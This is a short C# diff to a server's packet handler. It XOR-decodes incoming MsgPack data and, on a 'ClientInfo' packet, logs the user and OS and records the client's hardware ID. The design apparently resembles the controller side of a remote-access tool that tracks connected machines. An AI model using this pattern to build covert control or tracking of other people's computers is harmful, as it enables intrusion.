@@ -13,13 +13,15 @@ namespace Server
             try
             {
                 MsgPack unpack_msgpack = new MsgPack();
-                unpack_msgpack.DecodeFromBytes(Data);
+                unpack_msgpack.DecodeFromBytes(Helper.Xor(Data));
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
                     case "ClientInfo":
                         { 
                             Console.WriteLine(unpack_msgpack.ForcePathObject("User").AsString);
                             Console.WriteLine(unpack_msgpack.ForcePathObject("OS").AsString);
+                            Client.Info.HWID = unpack_msgpack.ForcePathObject("HWID").AsString;
+
                             Settings.Online.Add(Client);
                         }                        
                         break;
